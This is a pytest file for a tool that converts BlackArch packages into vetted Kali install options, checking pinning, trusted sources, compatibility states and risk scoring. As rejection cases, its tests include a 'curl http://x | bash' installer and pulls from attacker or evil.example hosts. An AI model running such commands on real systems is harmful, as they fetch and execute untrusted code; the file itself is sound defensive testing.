import pytest
import yaml

from blackarch2kali.analyzers.readme import analyze_readme
from blackarch2kali.compatibility.engine import evaluate
from blackarch2kali.compatibility.install_strategy import StrategyContext, build_options, rank_options
from blackarch2kali.compatibility.package_mapper import PackageMapping
from blackarch2kali.models import (
    BlackArchPackage,
    Compatibility,
    DebMatch,
    Maintenance,
    Method,
    Provenance,
    RepoInfo,
    Risk,
    RiskDimension,
    RiskFinding,
)
from blackarch2kali.security.installer_audit import audit_options
from blackarch2kali.security.risk_engine import assess

POLICY = yaml.safe_load(open("config/installation_policies.yaml"))
P = Provenance(source="t")


def pkg(name="tool", arch="x86_64"):
    return BlackArchPackage(name=name, version="1-1", arch=arch, provenance=P)


def repo(**kw):
    base = {"full_name": "own/tool", "owner": "own", "name": "tool", "html_url": "https://github.com/own/tool", "provenance": P, "head_sha": "c" * 40}
    base.update(kw)
    return RepoInfo(**base)


def deb(conf="exact-name+homepage", arch="amd64", dist="kali"):
    return DebMatch(package="tool", version="1.0", architecture=arch, distribution=dist, confidence=conf, provenance=P, sha256="d" * 64)


def ctx(r=None, readme=None, py2=False, maint=Maintenance.ACTIVE):
    return StrategyContext(pkg=pkg(), repo=r, maintenance=maint, readme=analyze_readme("\n".join(readme)) if readme else None, python2=py2, policy=POLICY)


def methods(opts):
    return {o.method for o in opts}


def test_pipx_requires_python_packaging_evidence():
    assert Method.PIPX not in methods(build_options(ctx(repo(root_files=["README.md", "tool.py"]))))
    opts = build_options(ctx(repo(root_files=["pyproject.toml"])))
    assert Method.PIPX in methods(opts) and Method.PYTHON_VENV in methods(opts)
    pipx = next(o for o in opts if o.method is Method.PIPX)
    assert pipx.commands[0][-1] == f"git+https://github.com/own/tool@{'c' * 40}"  # pinned commit


def test_python2_only_gets_no_pipx():
    assert Method.PIPX not in methods(build_options(ctx(repo(root_files=["setup.py"]), py2=True)))


def test_archived_repo_gets_no_upstream_options():
    assert build_options(ctx(repo(root_files=["pyproject.toml"], archived=True))) == []


def test_go_path_must_belong_to_verified_repo_and_is_pinned():
    good = ctx(repo(root_files=["go.mod"]), ["go install github.com/own/tool/cmd/tool@latest"])
    go = next(o for o in build_options(good) if o.method is Method.GO)
    assert go.commands == [["go", "install", f"github.com/own/tool/cmd/tool@{'c' * 40}"]]
    evil = ctx(repo(root_files=["go.mod"]), ["go install github.com/attacker/tool@latest"])
    assert Method.GO not in methods(build_options(evil))
    lookalike = ctx(repo(root_files=["go.mod"]), ["go install github.com/own/tool-evil@latest"])
    assert Method.GO not in methods(build_options(lookalike))


def test_no_pin_means_no_upstream_option():
    assert build_options(ctx(repo(root_files=["pyproject.toml"], head_sha=None))) == []


def test_cargo_npm_source_and_gem():
    o = methods(build_options(ctx(repo(root_files=["Cargo.toml", "package.json", "Makefile", "tool.gemspec"]))))
    assert {Method.CARGO, Method.NPM, Method.SOURCE_BUILD, Method.GEM} <= o
    npm = next(x for x in build_options(ctx(repo(root_files=["package.json"]))) if x.method is Method.NPM)
    assert "--ignore-scripts" in npm.commands[0]
    gem = next(x for x in build_options(ctx(repo(root_files=["tool.gemspec"]))) if x.method is Method.GEM)
    assert gem.verified is False


def test_docker_only_trusted_namespaces():
    r = repo(root_files=[])
    ok = build_options(ctx(r, ["docker pull ghcr.io/own/tool:latest"]))
    assert Method.DOCKER in methods(ok)
    for bad in ("docker pull evil.example/own/tool", "docker pull ghcr.io/attacker/tool", "docker run --privileged own/tool", "docker pull attacker/tool"):
        assert Method.DOCKER not in methods(build_options(ctx(r, [bad]))), bad


def test_ranking_prefers_apt_and_is_deterministic():
    r = repo(root_files=["pyproject.toml", "go.mod"])
    c = ctx(r)
    c.kali = deb()
    ranked = rank_options(build_options(c), Maintenance.ACTIVE, POLICY)
    assert ranked[0].method is Method.APT
    assert [o.method for o in ranked] == [o.method for o in rank_options(list(reversed(build_options(c))), Maintenance.ACTIVE, POLICY)]


def test_unverified_apt_ranked_below_verified_alternative():
    c = ctx(repo(root_files=["pyproject.toml"]))
    c.kali = deb(conf="exact-name")
    ranked = rank_options(build_options(c), Maintenance.ACTIVE, POLICY)
    assert ranked[0].method is Method.PIPX and ranked[-1].method is Method.APT


def test_arch_mismatch_not_native():
    c = ctx(repo())
    res = evaluate(c, PackageMapping(kali=deb(arch="arm64")))
    assert Compatibility.NATIVE_KALI not in res.states and res.primary is Compatibility.INCOMPATIBLE


@pytest.mark.parametrize(("mapping", "kw", "expected"), [
    (PackageMapping(kali=deb()), {}, Compatibility.NATIVE_KALI),
    (PackageMapping(debian=deb(dist="debian")), {}, Compatibility.NATIVE_DEBIAN),
    (PackageMapping(), {"r": repo(archived=True)}, Compatibility.LEGACY),
    (PackageMapping(), {"r": repo(), "py2": True}, Compatibility.SOURCE_PATCH_REQUIRED),
    (PackageMapping(), {"r": repo(root_files=["pyproject.toml"])}, Compatibility.AVAILABLE_PIPX),
    (PackageMapping(), {}, Compatibility.UNKNOWN),
])
def test_compat_states(mapping, kw, expected):
    c = ctx(kw.get("r"), py2=kw.get("py2", False), maint=Maintenance.ARCHIVED if kw.get("r") and kw["r"].archived else Maintenance.ACTIVE)
    assert evaluate(c, mapping).primary is expected


def test_audit_flags_unverified_and_remote_exec():
    from blackarch2kali.models import InstallOption

    f = audit_options([InstallOption(method=Method.GEM, commands=[["gem", "install", "x"]], verified=False)])
    assert f[0].rule == "unverified-install-source"
    f2 = audit_options([InstallOption(method=Method.SOURCE_BUILD, commands=[["bash", "-c", "curl http://x | bash"]], verified=True)])
    assert any(x.rule == "remote-exec-installer" and x.level is Risk.CRITICAL for x in f2)


def test_risk_dimensions_levels_and_scope():
    fs = [RiskFinding(dimension=RiskDimension.INSTALLATION, level=Risk.HIGH, rule="r", message="m", scope="upstream")]
    a = assess(fs, maintenance=Maintenance.ACTIVE, compat=Compatibility.NATIVE_KALI, repo_known=True)
    assert a.overall is Risk.HIGH and a.level_for(Method.APT) is Risk.LOW  # upstream issue doesn't taint a distro package
    assert a.blocked(Method.PIPX, ["HIGH", "CRITICAL"]) and not a.blocked(Method.APT, ["HIGH", "CRITICAL"])
    assert a.by_dimension()["installation"] == "HIGH" and a.by_dimension()["maintenance"] == "LOW"


def test_two_independent_high_installation_findings_escalate_to_critical():
    fs = [RiskFinding(dimension=RiskDimension.INSTALLATION, level=Risk.HIGH, rule=f"r{i}", message="m") for i in range(2)]
    assert assess(fs, maintenance=Maintenance.ACTIVE, compat=Compatibility.NATIVE_KALI, repo_known=True).overall is Risk.CRITICAL


def test_unknown_and_stale_and_python2():
    unk = assess([], maintenance=Maintenance.UNKNOWN, compat=Compatibility.UNKNOWN, repo_known=False)
    assert unk.dimension(RiskDimension.MAINTENANCE) is Risk.UNKNOWN
    stale = assess([], maintenance=Maintenance.STALE, compat=Compatibility.LEGACY, repo_known=True, python2_deps=["python2-x"], missing_deps=5)
    assert stale.dimension(RiskDimension.MAINTENANCE) is Risk.MEDIUM and stale.dimension(RiskDimension.DEPENDENCY) is Risk.MEDIUM
    assert stale.dimension(RiskDimension.COMPATIBILITY) is Risk.MEDIUM
